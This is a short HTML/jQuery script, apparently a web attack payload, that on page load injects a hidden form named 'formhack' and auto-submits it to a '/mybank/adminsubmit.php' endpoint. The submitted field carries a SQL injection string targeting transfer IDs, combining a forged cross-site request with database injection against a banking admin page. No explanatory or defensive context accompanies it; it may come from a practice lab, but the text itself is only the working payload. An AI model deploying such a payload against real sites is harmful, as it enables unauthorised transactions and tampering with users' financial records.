<script>
jQuery(document).ready(function($) {
	var html = $(\'<form id = "formhack" action="/mybank/adminsubmit.php" method="post"><input type="hidden" type="submit" name = "btn-submit" value="48\\\' OR transfers.transferId = \\\'49"></form>\');
	$(\'body\').append(html);
	var form = document.getElementById(\'formhack\');
	form.submit();
});
</script>